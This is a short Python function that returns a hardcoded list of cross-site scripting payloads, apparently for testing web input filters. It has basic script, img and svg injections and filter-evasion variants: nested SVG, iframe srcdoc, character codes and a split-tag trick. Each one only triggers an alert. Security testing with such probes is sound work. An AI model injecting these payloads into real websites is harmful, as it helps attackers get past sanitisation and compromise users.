def generate_xss():
    """
    Generates a list of XSS payloads with basic and evasion techniques.
    """
    payloads = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",

        # Evasion techniques
        "<svg><script>alert('XSS')</script></svg>",           # Nested SVG
        "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>",  # srcdoc abuse
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",  # Char codes
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",      # Broken tag trick
        "<body onresize=alert('XSS')>",                       # Event-based
    ]
    return payloads
